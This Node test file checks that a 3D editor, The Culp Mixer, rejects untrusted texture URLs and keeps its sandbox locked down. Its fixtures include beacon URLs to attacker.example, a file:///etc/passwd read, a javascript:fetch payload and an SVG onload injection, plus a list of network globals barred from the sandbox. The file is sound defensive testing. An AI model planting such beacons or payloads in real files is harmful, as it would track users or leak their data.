import test from 'node:test';
import assert from 'node:assert/strict';
import { Scene } from '../src/scene/Scene';
import { acceptTextures, isSelfContainedImage } from '../src/scene/Texture';
import { buildPrimitive } from '../src/mesh/primitives';

/**
 * Untrusted input.
 *
 * Two kinds reach The Culp Mixer: a program somebody generated, and a project file
 * somebody sent. Both were able to reach the network, and both were found by
 * an audit rather than by these tests — which is why the tests exist now.
 */

const PIXEL = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUg==';

test('a texture url that is not self-contained is refused', () => {
  // The exact shape of the beacon: an <img src> pointing off the machine,
  // fired by opening a file somebody shared.
  for (const hostile of [
    'http://attacker.example/pixel.png?who=you',
    'https://attacker.example/pixel.png',
    '//attacker.example/pixel.png',
    'HTTP://ATTACKER.EXAMPLE/p.png',
    ' https://attacker.example/p.png ',
    'file:///etc/passwd',
    'blob:http://localhost/abc',
    'javascript:fetch("https://attacker.example")',
    'data:text/html;base64,PHNjcmlwdD4=',
    'data:image/svg+xml,<svg onload="fetch(1)"/>',
  ]) {
    assert.equal(isSelfContainedImage(hostile), false, `"${hostile}" was accepted`);
  }
});

test('an embedded image is accepted, because that is what The Culp Mixer itself writes', () => {
  assert.equal(isSelfContainedImage(PIXEL), true);
  assert.equal(isSelfContainedImage('data:image/jpeg;base64,/9j/4AAQ'), true);
  assert.equal(isSelfContainedImage('data:image/webp;base64,UklGRg=='), true);
});

test('loading a crafted document drops the hostile texture and keeps the rest', () => {
  const scene = new Scene();
  scene.add('mesh', 'Cube', buildPrimitive('cube'));
  const doc = JSON.parse(JSON.stringify(scene.toJSON()));
  doc.textures = [
    { id: 1, name: 'beacon', url: 'http://attacker.example/p.png?victim=1', width: 2, height: 2 },
    { id: 2, name: 'real', url: PIXEL, width: 2, height: 2 },
  ];

  const back = Scene.fromJSON(doc);
  assert.equal(back.textures.length, 1, 'the hostile texture was loaded');
  assert.equal(back.textures[0].name, 'real');
  assert.equal(back.rejectedTextures.length, 1, 'the refusal was not reported');
  assert.match(back.rejectedTextures[0], /beacon/);
  // The geometry is still there: one bad texture must not cost somebody their
  // whole project.
  assert.equal(back.objects.size, 1, 'the document was thrown away over a texture');
});

test('a document with no textures still loads and reports nothing', () => {
  const scene = new Scene();
  scene.add('mesh', 'Cube', buildPrimitive('cube'));
  const back = Scene.fromJSON(JSON.parse(JSON.stringify(scene.toJSON())));
  assert.deepEqual(back.rejectedTextures, []);
});

test('textures The Culp Mixer saved survive its own round trip untouched', () => {
  // The filter must not break the ordinary case it is protecting.
  const scene = new Scene();
  scene.add('mesh', 'Cube', buildPrimitive('cube'));
  scene.textures.push({ id: 7, name: 'paint', url: PIXEL, width: 4, height: 8 });
  const back = Scene.fromJSON(JSON.parse(JSON.stringify(scene.toJSON())));
  assert.equal(back.textures.length, 1);
  assert.deepEqual(back.textures[0], { id: 7, name: 'paint', url: PIXEL, width: 4, height: 8 });
  assert.deepEqual(back.rejectedTextures, []);
});

test('rubbish in the texture list is dropped without throwing', () => {
  const kept = acceptTextures([null, 'nope', 42, {}, { url: 123 }, { url: PIXEL, name: 'ok' }]);
  assert.equal(kept.textures.length, 1);
  assert.equal(kept.textures[0].name, 'ok');
  assert.doesNotThrow(() => acceptTextures(undefined));
  assert.doesNotThrow(() => acceptTextures('not an array'));
});

test('the sandbox lockdown is an allowlist, not a list of known-bad names', async () => {
  // The audit found WebSocketStream reachable: WebSocket was on the denylist
  // and its successor was not. A denylist loses that race for ever, so the
  // harness now removes everything it does not explicitly need — and this
  // asserts the shape of that, so nobody quietly turns it back round.
  const { HARNESS_SOURCE } = await import('../src/build/sandbox');
  assert.ok(/var allowed = \{/.test(HARNESS_SOURCE),
    'the harness no longer carries an allowlist');
  assert.ok(/getOwnPropertyNames\(scope\)/.test(HARNESS_SOURCE),
    'the harness does not sweep the global surface');
  // Names that must never be in the allowlist, whatever else changes.
  const allowBlock = HARNESS_SOURCE.slice(
    HARNESS_SOURCE.indexOf('var allowed = {'),
    HARNESS_SOURCE.indexOf('var shadowed'),
  );
  for (const forbidden of [
    'fetch', 'XMLHttpRequest', 'WebSocket', 'WebSocketStream', 'importScripts',
    'indexedDB', 'caches', 'localStorage', 'sessionStorage', 'navigator',
    'SharedArrayBuffer', 'Atomics', 'WebAssembly', 'BackgroundFetchManager',
  ]) {
    assert.ok(!new RegExp(`\\\\b${forbidden}\\\\s*:`).test(allowBlock),
      `${forbidden} is on the sandbox allowlist`);
  }
});

test('the page carries a script-src policy, because import() is syntax', async () => {
  // Dynamic import() cannot be deleted off the global: it is a keyword, and it
  // fetches. A blob Worker inherits its creator's policy, so the meta tag is
  // what closes it. Asserted here because an index.html edit that dropped it
  // would reopen a hole with nothing else failing.
  const { readFileSync } = await import('node:fs');
  const html = readFileSync('index.html', 'utf8');
  assert.match(html, /http-equiv="Content-Security-Policy"/,
    'index.html has no Content-Security-Policy');
  const policy = html.match(/Content-Security-Policy"\s+content="([^"]+)"/)?.[1] ?? '';
  assert.match(policy, /script-src[^;]*'self'/, 'script-src does not pin to self');
  assert.ok(!/script-src[^;]*\*/.test(policy), 'script-src allows any host');
  assert.match(policy, /img-src[^;]*data:/, 'img-src does not allow embedded images');
  assert.ok(!/img-src[^;]*https?:/.test(policy), 'img-src allows remote images');

  // connect-src is deliberately absent, and this records why so it is not
  // "tightened" by somebody who has not read index.html. Pinning it was tried
  // and reverted: the Build feature fetches whatever model endpoint the person
  // configures — localhost, another machine on their network, or a hosted
  // OpenAI-compatible one — and a host list breaks all of that. It buys
  // nothing either way, because the sandbox's own reach is removed at the
  // worker global rather than by policy.
  assert.ok(!/connect-src/.test(policy),
    'connect-src was added to the policy; it breaks user-configured model endpoints');
});
